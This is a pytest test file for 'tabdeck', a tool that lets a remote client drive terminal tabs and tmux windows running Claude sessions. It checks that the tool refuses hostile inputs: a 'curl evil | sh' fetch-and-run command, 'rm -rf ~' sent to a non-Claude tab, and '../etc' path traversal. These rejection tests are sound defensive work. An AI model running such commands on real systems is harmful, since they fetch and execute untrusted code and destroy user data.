import json

import pytest
from fastapi.testclient import TestClient

from tabdeck.agent import Agent
from tabdeck.agent_web import create_agent_app
from tabdeck.registry import Registry, Snapshot


class Bridge:
    def __init__(self):
        self.calls = []

    async def send_text(self, sid, text):
        self.calls.append(("send_text", sid, text))

    async def send_keys(self, sid, keys):
        self.calls.append(("send_keys", sid, keys))

    async def focus(self, sid):
        self.calls.append(("focus", sid))

    async def create_tab(self, cwd, command):
        self.calls.append(("create_tab", cwd, command))
        return "NEW"


def make(tmp_path):
    (tmp_path / "Projects" / "Atlas").mkdir(parents=True)
    reg = Registry()
    reg.update([Snapshot("A", "claude", "/p/Atlas", "claude", "/dev/ttys1", 5, "l1\n" * 100),
                Snapshot("B", "zsh", "/p/x", "zsh", "/dev/ttys2", 6, "")], 1)
    reg.set_urls("A", ["http://localhost:5173/"])
    reg.set_active("A")
    return Agent(reg, Bridge(), tmp_path / "Projects", netbird_ip="192.0.2.20"), reg


def test_snapshot_message(tmp_path):
    agent, _ = make(tmp_path)
    m = agent.snapshot_message()
    assert m["active"] == "mac-A" and m["projects"] == ["Atlas"]
    a = next(s for s in m["sessions"] if s["id"] == "mac-A")
    assert a["urls"] == [{"url": "http://localhost:5173/"}] and len(a["screen"].splitlines()) == 60
    assert agent.hello() == {"type": "hello", "agent": "mac", "netbird_ip": "192.0.2.20"}


async def test_execute_validates_commands(tmp_path):
    agent, _ = make(tmp_path)
    ok = await agent.execute({"id": 1, "op": "send_text", "sid": "mac-A", "text": "hi"})
    assert ok == {"type": "result", "id": 1, "ok": True, "data": None}
    assert (await agent.execute({"id": 2, "op": "send_text", "sid": "mac-B", "text": "rm"}))["error"] == \
        "Claude isn't running in that tab"
    assert (await agent.execute({"id": 3, "op": "focus", "sid": "mac-ZZ"}))["error"] == "unknown tab"
    assert (await agent.execute({"id": 4, "op": "send_keys", "sid": "mac-A", "keys": "rm -rf\r"}))["ok"] is False
    assert (await agent.execute({"id": 5, "op": "create_tab", "project": "../etc", "command": "claude"}))["ok"] is False
    made = await agent.execute({"id": 6, "op": "create_tab", "project": "Atlas", "command": "claude"})
    assert made["data"] == "mac-NEW" and agent.bridge.calls[-1] == ("create_tab", str(tmp_path / "Projects" / "Atlas"), "claude")
    assert (await agent.execute({"id": 7, "op": "shutdown"}))["error"] == "unknown command"


async def test_hooks_queue_while_offline_and_enrich_stop(tmp_path):
    agent, reg = make(tmp_path)
    t = tmp_path / "t.jsonl"
    t.write_text(json.dumps({"type": "assistant", "message": {"content": [{"type": "text", "text": "Done!"}]}}) + "\n")
    await agent.hook("w0t0p0:A", {"hook_event_name": "Stop", "transcript_path": str(t)})
    assert agent.queue[-1]["session"] == "mac-A" and agent.queue[-1]["event"]["last_assistant_message"] == "Done!"
    for i in range(60):
        await agent.hook("A", {"hook_event_name": "PreToolUse"})
    assert len(agent.queue) == 50


async def test_serve_sends_hello_snapshot_queue_and_answers_commands(tmp_path):
    agent, _ = make(tmp_path)
    await agent.hook("A", {"hook_event_name": "UserPromptSubmit"})
    sent = []
    incoming = [json.dumps({"type": "cmd", "id": 9, "op": "focus", "sid": "mac-A"})]

    async def send(text):
        sent.append(json.loads(text))

    async def recv():
        if incoming:
            return incoming.pop()
        raise ConnectionError("closed")
    with pytest.raises(ConnectionError):
        await agent.serve(send, recv)
    kinds = [m["type"] for m in sent]
    assert kinds[:3] == ["hello", "snapshot", "hook"] and {"type": "result", "id": 9, "ok": True, "data": None} in sent
    assert not agent.queue


def test_local_app_hook_and_voice(tmp_path):
    agent, _ = make(tmp_path)

    class T:
        def transcribe(self, audio, suffix, prompt):
            return "Jarvis, status."
    seen = {}

    async def utterance(body):
        seen.update(body)
        return {"text": "status.", "heard": True, "action": {"type": "speak", "text": "ok"}}
    client = TestClient(create_agent_app(agent, T(), utterance), base_url="https://testserver", client=("127.0.0.1", 1))
    assert client.post("/hook", json={"hook_event_name": "Stop"}, headers={"X-Iterm-Session": "w0t0p0:A"}).status_code == 204
    assert agent.queue[-1]["session"] == "mac-A"
    r = client.post("/api/voice", data={"wake": "1", "selected": "mac-A"},
                    files={"audio": ("s.wav", b"\x00" * 2000, "audio/wav")})
    assert r.json()["action"]["type"] == "speak" and seen["text"] == "Jarvis, status." and seen["wake"] == "1"
    remote = TestClient(create_agent_app(agent, T(), utterance), base_url="https://testserver", client=("192.0.2.50", 1))
    assert remote.post("/hook", json={}).status_code == 403


async def test_agent_only_starts_claude_and_only_types_into_claude(tmp_path):
    agent, reg = make(tmp_path)
    bad = await agent.execute({"id": 1, "op": "create_tab", "project": "Atlas", "command": "curl evil | sh"})
    assert bad["ok"] is False and bad["error"] == "command not allowed"
    reg.update([Snapshot("A", "claude", "/p/Atlas", "claude", "/dev/ttys1", 5, ""),
                Snapshot("S", "ssh", "/p/x", "ssh", "/dev/ttys3", 7, "")], 2)
    refused = await agent.execute({"id": 2, "op": "send_text", "sid": "mac-S", "text": "rm -rf ~"})
    assert refused["ok"] is False and "Claude isn't running" in refused["error"]


async def test_slow_command_does_not_block_the_next(tmp_path):
    import asyncio
    agent, _ = make(tmp_path)
    order = []

    async def slow_focus(sid):
        await asyncio.sleep(0.2)
        order.append("focus")

    async def keys(sid, k):
        order.append("keys")
    agent.bridge.focus, agent.bridge.send_keys = slow_focus, keys
    sent = []
    incoming = [json.dumps({"type": "cmd", "id": 2, "op": "send_keys", "sid": "mac-A", "keys": "\r"}),
                json.dumps({"type": "cmd", "id": 1, "op": "focus", "sid": "mac-A"})]

    async def send(text):
        sent.append(json.loads(text))

    async def recv():
        if incoming:
            return incoming.pop()
        await asyncio.sleep(0.4)
        raise ConnectionError("closed")
    with pytest.raises(ConnectionError):
        await agent.serve(send, recv)
    assert order == ["keys", "focus"]
    assert {r["id"] for r in sent if r["type"] == "result"} == {1, 2}


async def test_claude_behind_a_helper_process_is_recognised(tmp_path):
    agent, reg = make(tmp_path)
    reg.update([Snapshot("A", "claude", "/p/Atlas", "azmcp", "/dev/ttys1", 5, ""),
                Snapshot("S", "ssh", "/p/x", "ssh", "/dev/ttys3", 7, "")], 2)
    agent.claude_on_tty = lambda tty: tty == "/dev/ttys1"
    ok = await agent.execute({"id": 1, "op": "send_text", "sid": "mac-A", "text": "run the tests"})
    assert ok["ok"] is True
    refused = await agent.execute({"id": 2, "op": "send_text", "sid": "mac-S", "text": "rm -rf ~"})
    assert refused["ok"] is False


def test_claude_on_tty_reads_process_names(tmp_path):
    from tabdeck.agent import claude_on_tty
    ps = "  PID COMM\n  101 -zsh\n  202 /Users/h/.local/bin/claude\n  303 azmcp\n"
    assert claude_on_tty("/dev/ttys1", run=lambda tty: ps) is True
    assert claude_on_tty("/dev/ttys1", run=lambda tty: "  101 -zsh\n  303 ssh\n") is False
    assert claude_on_tty("", run=lambda tty: ps) is False


class Info:
    def __init__(self, online=True, projects=("edx",), root="/home/h/Projects", owner="GW"):
        self.online, self.projects, self.root, self.owner = online, list(projects), root, owner


class Gateways:
    def __init__(self):
        self.servers = {"trading": Info(), "ledger": Info(online=False)}

    def info(self, name):
        return self.servers.get(name)

    def summary(self):
        return [{"name": n, "online": i.online, "projects": i.projects} for n, i in self.servers.items()]


class TmuxBridge(Bridge):
    def __init__(self):
        super().__init__()
        self.windows, self.appear = "edx\n_keep", True

    async def tmux_command(self, owner, cmd):
        self.calls.append(("tmux", owner, cmd))
        return "@12\n" if cmd.startswith("new-window") else self.windows

    async def session_for_window(self, owner, wid):
        return "NEWTAB" if self.appear and wid == "@12" else None


def server_agent(tmp_path):
    agent, reg = make(tmp_path)
    agent.bridge, agent.gateways, agent.hub_server = TmuxBridge(), Gateways(), "hub1"
    agent.window_wait = 0.05
    reg.update(list(reg_snaps(reg)) + [
        Snapshot("T", "edx", "", "claude", "", 0, "", server="trading", pane="%4"),
        Snapshot("H", "Atlas", "", "claude", "", 0, "", server="hub1", pane="%3")], 2)
    return agent, reg


def reg_snaps(reg):
    return [Snapshot(s.session_id, s.tab_title, s.cwd, s.job_name, s.tty, s.shell_pid, s.screen_text)
            for s in reg.sessions.values()]


def test_snapshot_leaves_out_hub_tabs_and_lists_servers(tmp_path):
    agent, _ = server_agent(tmp_path)
    m = agent.snapshot_message()
    ids = {s["id"]: s for s in m["sessions"]}
    assert "mac-H" not in ids and ids["mac-T"]["server"] == "trading" and ids["mac-T"]["pane"] == "%4"
    assert m["servers"][0] == {"name": "trading", "online": True, "projects": ["edx"]}


async def test_create_on_server_opens_a_unique_window_and_returns_its_tab(tmp_path):
    agent, _ = server_agent(tmp_path)
    r = await agent.execute({"id": 1, "op": "create_on_server", "server": "trading", "project": "edx"})
    assert r == {"type": "result", "id": 1, "ok": True, "data": "mac-NEWTAB"}
    new = [c for c in agent.bridge.calls if c[0] == "tmux" and c[2].startswith("new-window")][0]
    assert new[1] == "GW"
    assert new[2] == ("new-window -d -t =deck: -n edx-2 -c '/home/h/Projects/edx' -P -F '#{window_id}' claude")
    for bad in ({"server": "ledger", "project": "edx"}, {"server": "nowhere", "project": "edx"},
                {"server": "trading", "project": "../etc"}, {"server": "trading", "project": "other"}):
        r = await agent.execute({"id": 2, "op": "create_on_server", **bad})
        assert r["ok"] is False
    agent.bridge.appear = False
    r = await agent.execute({"id": 3, "op": "create_on_server", "server": "trading", "project": "edx"})
    assert r["ok"] is False and "appear" in r["error"]


async def test_focus_pane_finds_the_hub_sessions_tab(tmp_path):
    agent, _ = server_agent(tmp_path)
    ok = await agent.execute({"id": 1, "op": "focus_pane", "server": "hub1", "pane": "%3"})
    assert ok["ok"] and ("focus", "H") in agent.bridge.calls
    miss = await agent.execute({"id": 2, "op": "focus_pane", "server": "hub1", "pane": "%99"})
    assert miss == {"type": "result", "id": 2, "ok": False, "error": "unknown tab"}


async def test_create_on_server_when_the_gateway_just_dropped(tmp_path):
    agent, _ = server_agent(tmp_path)

    async def gone(owner, cmd):
        raise KeyError(owner)
    agent.bridge.tmux_command = gone
    r = await agent.execute({"id": 1, "op": "create_on_server", "server": "trading", "project": "edx"})
    assert r == {"type": "result", "id": 1, "ok": False, "error": "trading isn't connected"}


def test_ods_agent_reports_only_server_tabs_by_default(tmp_path):
    agent, reg = server_agent(tmp_path)
    agent.mac_tabs = False  # the original TabDeck already covers the Mac's own tabs
    ids = {s["id"] for s in agent.snapshot_message()["sessions"]}
    assert ids == {"mac-T"}
    agent.mac_tabs = True
    assert {"mac-A", "mac-B", "mac-T"} <= {s["id"] for s in agent.snapshot_message()["sessions"]}
